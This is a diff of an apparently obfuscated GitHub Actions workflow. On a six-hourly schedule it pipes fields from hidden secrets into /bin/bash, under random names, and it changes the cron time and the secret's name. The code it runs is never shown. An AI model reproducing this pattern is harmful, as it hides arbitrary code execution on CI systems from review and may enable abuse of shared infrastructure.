@@ -2,7 +2,7 @@ name: renhengxing4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 0/6 * * *'
+    - cron: '37 5/6 * * *'
 
 jobs:
   build:
@@ -11,17 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: renhengxing4567
         env:
-          g0: ${{ secrets.g0 }}
+          bc1: ${{ secrets.bc1 }}
         run: |
-          echo $g0 | jq -r .setme6214 | /bin/bash
-          echo $rv59 | jq -r .d0 | /bin/bash
-          echo $nzrt963 | jq -r .e58332 | /bin/bash
-          echo $xki05 | jq -r .a3447 | /bin/bash
-          echo $rmnz4 | jq -r .no3629 | /bin/bash
-          echo $r5 | jq -r .bp5991 | /bin/bash
-          echo $qw6219 | jq -r .dv6996 | /bin/bash
-          echo $hm6 | jq -r .jqxjk8003 | /bin/bash
-          echo $v04276 | jq -r .fehig717 | /bin/bash
-          echo $yp5 | jq -r .a8571 | /bin/bash
-          echo $lygxt520 | jq -r .kcybx9 | /bin/bash
+          echo $bc1 | jq -r .i77 | /bin/bash
+          echo $hwm86768 | jq -r .zigz9640 | /bin/bash
+          echo $jafcu444 | jq -r .herie59031 | /bin/bash
+          echo $wkvn1487 | jq -r .udsiv24195 | /bin/bash
+          echo $aj361 | jq -r .pxr91 | /bin/bash
+          echo $fcinz808 | jq -r .a4354 | /bin/bash
+          echo $bcg85009 | jq -r .gwufv08 | /bin/bash
 
